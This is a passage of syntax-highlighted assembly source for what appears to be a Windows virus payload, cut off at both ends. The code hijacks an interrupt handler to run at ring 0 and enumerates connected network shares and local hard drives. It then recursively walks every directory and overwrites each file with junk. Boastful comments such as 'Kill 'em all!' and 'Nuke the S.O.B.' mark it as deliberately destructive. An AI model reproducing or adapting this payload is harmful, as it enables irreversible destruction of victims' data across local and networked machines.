</span><span class="sc5">Exit_Check_PL</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">POPAD</span><span class="sc0">

        </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">Delay_Timer</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; Let's get ready to r0ck..</span><span class="sc0">
</span><span class="sc5">Payload</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Setup_Nuke_SEH</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_Delta</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">+(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Rest_Nuke_SEH</span><span class="sc0">

</span><span class="sc5">Setup_Nuke_SEH</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc8">EBX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc8">EBX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ESP</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; Obtain IDT.</span><span class="sc0">
        </span><span class="sc6">SIDT</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc1">; Our ring-0 INT exception-handler.</span><span class="sc0">

        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Ring0_Handler</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">+(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">         </span><span class="sc1">; Set our own ring-0 handler.</span><span class="sc0">

        </span><span class="sc6">ROR</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">+(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">                     </span><span class="sc1">; Raise ring-0 exception.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">+(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; Restore original handler.</span><span class="sc0">

        </span><span class="sc6">ROR</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">+(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">

</span><span class="sc5">Rest_Nuke_SEH</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc8">EBX</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Restore original SEH.</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Global_Handle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">  </span><span class="sc1">; Kill-list.</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">@8</span><span class="sc0">                      </span><span class="sc1">; Load network-library.</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'MPR'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@8</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixLoadLibraryA</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Error?</span><span class="sc0">
        </span><span class="sc6">JECXZ</span><span class="sc0">   </span><span class="sc5">JECXZ_Enum_L</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">                </span><span class="sc1">; Save base in EBX.</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">@9</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'WNetOpenEnumA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@9</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixGetProcAddress</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">JECXZ</span><span class="sc0">   </span><span class="sc5">Enum_Locals</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">WNetOpenEnumA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">@10</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'WNetEnumResourceA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@10</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixGetProcAddress</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
</span><span class="sc5">JECXZ_Enum_L</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">JECXZ</span><span class="sc0">   </span><span class="sc5">Enum_Locals</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">WNetEnumResourceA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">@11</span><span class="sc0">                     </span><span class="sc1">; Retrieve a find handle</span><span class="sc0">
</span><span class="sc5">Enum_Handle</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; to the system root.</span><span class="sc0">
</span><span class="sc5">@11</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">RESOURCETYPE_DISK</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">RESOURCE_CONNECTED</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">WNetOpenEnumA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Enum_Locals</span><span class="sc0">

                </span><span class="sc1">; Enumerate all active network-connections.</span><span class="sc0">

</span><span class="sc5">Retrieve_Enum</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Net_Resource</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">@12</span><span class="sc0">
</span><span class="sc5">Buffer_Size</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">666</span><span class="sc0">
</span><span class="sc5">@12</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">@13</span><span class="sc0">
</span><span class="sc5">Enum_Count</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">@13</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Enum_Handle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">WNetEnumResourceA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Enum_Locals</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">        </span><span class="sc1">; Found remote name.</span><span class="sc0">

        </span><span class="sc6">CLD</span><span class="sc0">

</span><span class="sc5">Copy_Target</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">LODSB</span><span class="sc0">                           </span><span class="sc1">; Copy the remote name to</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">                           </span><span class="sc1">; our kill-list.</span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">                  </span><span class="sc1">; Did the entire ASCIIZ ?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Copy_Target</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Retrieve_Enum</span><span class="sc0">

</span><span class="sc5">Enum_Locals</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc0">                     </span><span class="sc1">; Array of network-drives.</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">                     </span><span class="sc1">; Append local drives.</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">256</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixGetLogicalDriveStringsA</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

</span><span class="sc5">Drive_Loop</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">                     </span><span class="sc1">; What kind of disk is this?</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixGetDriveTypeA</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DRIVE_REMOVABLE</span><span class="sc0">     </span><span class="sc1">; Skip floppy-drives.</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Find_Next_Str</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DRIVE_CDROM</span><span class="sc0">         </span><span class="sc1">; Skip CD-ROM's.</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Find_Next_Str</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DRIVE_RAMDISK</span><span class="sc0">       </span><span class="sc1">; Skip RAM-disks.</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Find_Next_Str</span><span class="sc0">

</span><span class="sc5">CALL_Trash_Dir</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Trash_Directory</span><span class="sc0">         </span><span class="sc1">; Trash the root including</span><span class="sc0">
                        </span><span class="sc1">; all it's sub-directories.</span><span class="sc0">

</span><span class="sc5">Find_Next_Str</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CLD</span><span class="sc0">                             </span><span class="sc1">; Fetch next byte.</span><span class="sc0">
        </span><span class="sc6">LODSB</span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">                  </span><span class="sc1">; Found the end of ASCIIZ ?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Find_Next_Str</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Drive_Loop</span><span class="sc0">              </span><span class="sc1">; Thank you DRIVE through :P</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">                       </span><span class="sc1">; Heart stops..</span><span class="sc0">

</span><span class="sc1">;-----------------------------------</span><span class="sc0">
</span><span class="sc1">; Overwrites all bytes in all files</span><span class="sc0">
</span><span class="sc1">; in all directories on all drives.</span><span class="sc0">
</span><span class="sc1">;-----------------------------------</span><span class="sc0">
</span><span class="sc5">Trash_Directory</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">PUSHAD</span><span class="sc0">

        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">ESP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">318</span><span class="sc4">+</span><span class="sc2">260</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">; Reserve space on the stack,</span><span class="sc0">
                        </span><span class="sc1">; note that ESP must always</span><span class="sc0">
                        </span><span class="sc1">; point to a DWORD boundary.</span><span class="sc0">

        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">+</span><span class="sc2">318</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Save our current directory.</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">260</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixGetCurrentDirectoryA</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">                </span><span class="sc1">; Too big for our buffer?</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0">      </span><span class="sc5">JNZ_Exit_Trash</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Or the function failed?</span><span class="sc0">
        </span><span class="sc6">JECXZ</span><span class="sc0">   </span><span class="sc5">JNZ_Exit_Trash</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">                     </span><span class="sc1">; Change to found directory.</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixSetCurrentDirectoryA</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; Argh! something went wrong!</span><span class="sc0">
</span><span class="sc5">JNZ_Exit_Trash</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Exit_Trash_Dir</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; EBX = 0.</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESP</span><span class="sc0">                     </span><span class="sc1">; Find us a victim.</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">@14</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'*.*'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; Kill 'em all!</span><span class="sc0">
</span><span class="sc5">@14</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixFindFirstFileA</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Close_Find</span><span class="sc0">

</span><span class="sc5">Destroy_Loop</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESP.FFN_File_Name</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; Is it a directory?</span><span class="sc0">

        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESP.File_Attributes</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00010000b</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Trash_File</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">     </span><span class="sc1">; Fuck for '.'...</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Find_Next_Crap</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'..'</span><span class="sc0">    </span><span class="sc1">; Or '..'.</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Do_Trash_Dir</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc0">             </span><span class="sc1">; /0.</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Find_Next_Crap</span><span class="sc0">

</span><span class="sc5">Do_Trash_Dir</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Trash_Directory</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Find_Next_Crap</span><span class="sc0">

</span><span class="sc5">Trash_File</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">   </span><span class="sc1">; Clear all it's attributes.</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixSetFileAttributesA</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">JECXZ</span><span class="sc0">   </span><span class="sc5">Find_Next_Crap</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">                     </span><span class="sc1">; Open the target.</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixCreateFileA</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Find_Next_Crap</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">                     </span><span class="sc1">; Get it's filesize.</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixGetFileSize</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

                </span><span class="sc1">; K, time to say ur prares..</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">                     </span><span class="sc1">; Nuke the S.O.B.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">@15</span><span class="sc0">
                </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0DEADBEEFh</span><span class="sc0">
</span><span class="sc5">@15</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">444444h</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixWriteFile</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

                </span><span class="sc1">; Wasted, time to seal the tomb..</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixCloseHandle</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

</span><span class="sc5">Find_Next_Crap</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESP</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixFindNextFileA</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Destroy_Loop</span><span class="sc0">

</span><span class="sc5">Close_Find</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">                     </span><span class="sc1">; Close filehandle.</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixFindClose</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">+</span><span class="sc2">318</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Restore original directory.</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixSetCurrentDirectoryA</span><span class="sc0">
